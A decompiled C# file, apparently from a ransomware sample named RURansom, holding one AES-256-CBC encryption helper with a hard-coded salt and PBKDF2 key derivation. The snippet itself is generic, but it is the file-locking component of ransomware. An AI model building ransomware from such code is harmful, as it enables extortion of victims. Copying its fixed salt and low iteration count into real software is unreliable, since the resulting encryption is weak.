using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace RURansom
{
	// Token: 0x02000003 RID: 3
	public class AesCrypter
	{
		// Token: 0x06000008 RID: 8 RVA: 0x00002414 File Offset: 0x00000614
		public static byte[] AES_Encrypt(byte[] data, byte[] passwordBytes)
		{
			bool flag = Encoding.UTF8.GetString(data) == "";
			byte[] result;
			if (flag)
			{
				result = null;
			}
			else
			{
				byte[] salt = new byte[]
				{
					54,
					23,
					2,
					53,
					23,
					42,
					1,
					5
				};
				using (MemoryStream memoryStream = new MemoryStream())
				{
					using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
					{
						rijndaelManaged.KeySize = 256;
						rijndaelManaged.BlockSize = 128;
						Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 512);
						rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
						rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
						rijndaelManaged.Mode = CipherMode.CBC;
						using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
						{
							cryptoStream.Write(data, 0, data.Length);
							cryptoStream.Close();
						}
						result = memoryStream.ToArray();
					}
				}
			}
			return result;
		}
	}
}
